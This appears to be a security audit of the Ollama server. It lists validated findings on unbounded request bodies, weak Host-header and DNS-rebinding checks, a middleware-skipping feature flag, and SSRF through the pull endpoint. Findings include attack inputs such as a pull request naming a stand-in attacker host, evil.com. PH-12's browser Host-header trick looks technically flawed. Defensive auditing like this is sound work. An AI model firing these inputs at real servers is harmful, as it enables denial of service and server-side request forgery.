# Round 2 Hypotheses — Contradiction Reasoner (TRIZ / Contradiction Analysis)

## PH-09: Contradiction — zstd Path Has Size Cap; Non-zstd Path Does Not (Asymmetric Defense)

**Reasoning model**: TRIZ (Physical Contradiction: the same code should both limit body size AND not limit body size)
**Target**: `server/cloud_proxy.go:80-96` — zstd vs non-zstd branch
**Contradiction identified**: The zstd decompression path wraps the body with `http.MaxBytesReader(20MB)` (line 88-89). The non-zstd path calls `readRequestBody` which calls `io.ReadAll` with no limit. An attacker who simply omits `Content-Encoding: zstd` from the request bypasses the only size control that exists in the middleware.
**Attack input**: POST `/v1/chat/completions` with an enormous JSON body (`Content-Length: <huge>` or chunked), no Content-Encoding header
**Code path**: `cloudPassthroughMiddleware` → `c.GetHeader("Content-Encoding") == "zstd"` is false → `readRequestBody(c.Request)` → `io.ReadAll(r.Body)` → OOM
**Assumption broken**: The design assumes compressible bodies are the only attack vector; uncompressed multi-gigabyte JSON is treated as "normal" traffic.
**Severity estimate**: HIGH
**Status**: VALIDATED — asymmetry confirmed at cloud_proxy.go:80-96.

---

## PH-10: Contradiction — `allowedHostsMiddleware` Validates Host for Loopback but Not for LAN Exposures (Inverted Security)

**Reasoning model**: TRIZ (Technical Contradiction: the middleware that protects against DNS rebinding is disabled precisely when DNS rebinding is most dangerous)
**Target**: `server/routes.go:1615-1618` — non-loopback short-circuit
**Contradiction identified**: DNS rebinding attacks are more dangerous on LAN-exposed (`0.0.0.0`) servers because all LAN clients can reach them. The middleware disables ALL host validation for non-loopback binds, maximizing exposure exactly where protection is most needed.
**Attack input**: `OLLAMA_HOST=0.0.0.0:11434` configured (common for LAN sharing); attacker sets `Host: localhost` in cross-origin request; CORS `AllowOrigins=*` (common in app mode) allows the pre-flight; `allowedHostsMiddleware` accepts unconditionally.
**Code path**: request arrives on `0.0.0.0:11434` → `netip.ParseAddrPort(addr.String())` succeeds, `addr.Addr().IsLoopback()` is false → `c.Next()` without any host check
**Assumption broken**: "LAN bind = user deliberately opened the port = no host header threat." Reality: LAN browsers can still DNS-rebind or the user may have set `0.0.0.0` for convenience without considering browser-origin threats.
**Severity estimate**: HIGH
**Status**: VALIDATED — routes.go:1615-1618 confirmed.

---

## PH-11: Contradiction — `client2` Feature Flag Breaks Security Invariant of Middleware Stack

**Reasoning model**: TRIZ (System Conflict: feature flag enables new code path that silently removes security middleware)
**Target**: `server/routes.go:1735-1744` + `server/internal/registry/server.go:114-128`
**Contradiction identified**: Enabling `OLLAMA_EXPERIMENT=client2` (intended to test a new registry client) silently removes `allowedHostsMiddleware` and CORS from the `/api/pull` and `/api/delete` paths. The security properties of these endpoints regress to pre-CVE-2024-28224 state without any warning in documentation or runtime logging.
**Attack input**: Any browser page (no Host validation required) can POST `/api/pull {"model":"evil.com/pwn:latest"}` when client2 is enabled; no DNS rebinding needed.
**Code path**: `registry.Local.ServeHTTP` → `serveHTTP` → case `/api/pull` → `s.handlePull` directly; gin router (and its middleware stack) is invoked only for other paths via `s.Fallback.ServeHTTP`
**Assumption broken**: The feature flag is assumed to be "just a different client implementation" when it actually restructures the HTTP dispatch layer.
**Severity estimate**: HIGH (auth middleware skip is complete for targeted endpoints)
**Status**: VALIDATED — confirmed by reading registry/server.go:114-128 and routes.go:1735-1744.

---

## PH-12: Contradiction — `IsPrivate()` Grants Trust to RFC1918 Addresses in Host Header

**Reasoning model**: TRIZ (Contradiction: the check that should restrict access by requiring loopback actually expands access to all private IPs)
**Target**: `server/routes.go:1625-1629` — `allowedHostsMiddleware` IP allow branch
**Contradiction identified**: `addr.IsPrivate()` returns true for `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `fc00::/7`. A browser performing DNS rebinding can set `Host: 192.168.1.50` (the victim machine's LAN IP) and pass the host validation check even on a loopback-bound server. The intent was to allow `Host: 127.0.0.1` (loopback) but the implementation accepts all RFC1918.
**Attack input**: Browser page issues `fetch("http://127.0.0.1:11434/api/generate", {headers: {"Host": "192.168.1.50"}})` — on loopback bind, host validation passes because `192.168.1.50` parses as a private IP.
**Code path**: host = `192.168.1.50` → `netip.ParseAddr("192.168.1.50")` succeeds → `addr.IsPrivate()` true → `c.Next()`
**Assumption broken**: The check conflates "host is a private address" with "this is a legitimate local request."
**Severity estimate**: HIGH
**Status**: VALIDATED — routes.go:1626 confirmed.

---

## PH-13: Contradiction — Anthropic Web Search Orchestrator Bypasses Cloud Middleware Abort

**Reasoning model**: TRIZ (Conflict: cloudPassthroughMiddleware aborts cloud requests, but the Anthropic web search path conditionally continues through local middleware)
**Target**: `server/cloud_proxy.go:122-131` — `legacyCloudAnthropicKey` branch
**Contradiction identified**: When a POST to `/v1/messages` contains a model flagged as `:cloud` AND has a `web_search` tool, `cloudPassthroughMiddleware` sets `legacyCloudAnthropicKey=true` and calls `c.Next()` instead of proxying directly. The `AnthropicMessagesMiddleware` then processes the request locally, but the underlying `ChatHandler` routes it back to cloud via `proxyCloudJSONRequestWithPath(c, req, "/api/chat", ...)`. This creates a double-proxy path where the body is first translated from Anthropic format to Ollama API format, then proxied to ollama.com as an Ollama `/api/chat` request.
**Attack input**: POST `/v1/messages` with `{"model":"gpt-4:cloud","tools":[{"type":"web_search_20250305"}],"messages":[...]}`
**Code path**: `cloudPassthroughMiddleware` → detects `:cloud` + web_search tool → `c.Set(legacyCloudAnthropicKey, true); c.Next()` → `AnthropicMessagesMiddleware` → `ChatHandler` → `modelRef.Source == modelSourceCloud` → `c.GetBool(legacyCloudAnthropicKey)` is true → `proxyCloudJSONRequestWithPath(c, req, "/api/chat", ...)` — sends Ollama-format body to `/api/chat` on ollama.com rather than Anthropic format to `/v1/messages`.
**Assumption broken**: ollama.com's `/api/chat` endpoint may not behave identically to `/v1/messages` for web search tool calls; the format translation may introduce response inconsistencies or unexpected behavior in the cloud backend.
**Severity estimate**: MEDIUM (behavioral inconsistency; potential for response format confusion leading to unhandled data in `WebSearchAnthropicWriter`)
**Status**: VALIDATED — cloud_proxy.go:122-131 and routes.go:2124-2130 confirmed.

---

## PH-14: Contradiction — `cloudPassthroughMiddleware` Buffers Body Before Handing to Next Handler; Handler Also Reads Body

**Reasoning model**: TRIZ (Resource Conflict: the same resource — request body — is consumed by middleware, then expected to still be available to the downstream handler)
**Target**: `server/cloud_proxy.go:96-101` — `readRequestBody` restores body
**Contradiction identified**: `readRequestBody` calls `io.ReadAll(r.Body)`, then sets `r.Body = io.NopCloser(bytes.NewReader(body))` to allow downstream re-reading. This buffering happens for ALL POST requests to `/v1/*` even when the model is NOT a cloud model. When the model check determines local routing (`c.Next()`), the handler (`ChatHandler`, etc.) re-reads the body via `c.ShouldBindJSON`. The buffered body size has no limit (per PH-09/PH-02), so the unbounded read occurs unconditionally for every incoming POST.
**Attack input**: Any large non-zstd POST to `/v1/chat/completions` with a local model name — the cloud middleware buffers the body into RAM even though no cloud proxy will be invoked.
**Code path**: `cloudPassthroughMiddleware` → `readRequestBody` → `io.ReadAll` (unbounded) → `parseAndValidateModelRef(model)` determines local model → `c.Next()` → `ChatMiddleware` → `c.ShouldBindJSON` → re-reads the already-buffered body
**Security consequence**: OOM DoS via uncompressed body regardless of local/cloud model routing. Body is buffered twice (once in `readRequestBody`, once in the `bytes.Buffer` inside `ChatMiddleware`).
**Severity estimate**: HIGH (amplification of PH-02)
**Status**: VALIDATED — cloud_proxy.go:289-300 and middleware/openai.go:422-435 confirmed.

---

## PH-15: Contradiction — `ResponsesMiddleware` Applies Size Cap Only for zstd, Then Passes Unbounded JSON to `FromResponsesRequest`

**Reasoning model**: TRIZ
**Target**: `middleware/openai.go:509-570` — `ResponsesMiddleware`
**Contradiction identified**: The middleware applies `http.MaxBytesReader(20MB)` for zstd content, but `c.ShouldBindJSON(&req)` (line 523) is then called on the potentially-still-unbounded body for non-zstd requests. `ShouldBindJSON` uses `json.NewDecoder` which reads the entire stream. A request with `Content-Type: application/json` and no `Content-Encoding` sends an unbounded body directly to `json.Unmarshal`.
**Attack input**: POST `/v1/responses` with a valid-looking but multi-hundred-MB JSON body; no Content-Encoding header
**Code path**: `ResponsesMiddleware` → zstd check fails (no header) → `c.ShouldBindJSON(&req)` → `json.NewDecoder(c.Request.Body).Decode(&req)` → unbounded read
**Security consequence**: OOM DoS via the Responses API endpoint.
**Severity estimate**: HIGH
**Status**: VALIDATED — middleware/openai.go:511-523 confirmed.

---

## PH-16: Contradiction — `/api/pull` Allows HTTP via `req.Insecure` But Host Is Not Allowlisted

**Reasoning model**: TRIZ (Security vs. Functionality: `req.Insecure` flag was meant to allow testing against local registries but combined with no host allowlist enables SSRF over HTTP to any host)
**Target**: `server/routes.go:914-959` — `PullHandler`; `server/images.go:853-858` — `pullModelManifest`
**Attack input**: POST `/api/pull {"model":"192.168.1.1/ns/model:tag","insecure":true}` — issues HTTP GET to `http://192.168.1.1/v2/ns/model/manifests/tag`
**Code path**: `PullHandler` → `parseNormalizePullModelRef` (validates name structure, not host) → `PullModel` → `pullModelManifest` → builds URL from `model.Name.BaseURL()` with `ProtocolScheme = "http"` when `Insecure=true` → `makeRequest` → outbound HTTP to attacker-supplied IP
**Assumption broken**: `req.Insecure` is expected to only affect TLS verification mode, not to enable SSRF to arbitrary hosts over HTTP.
**Severity estimate**: HIGH (SSRF; combined with PH-03, fully unauthenticated)
**Status**: VALIDATED — routes.go:952-954 sets `Insecure: req.Insecure` directly; no host allowlist check before manifest fetch.
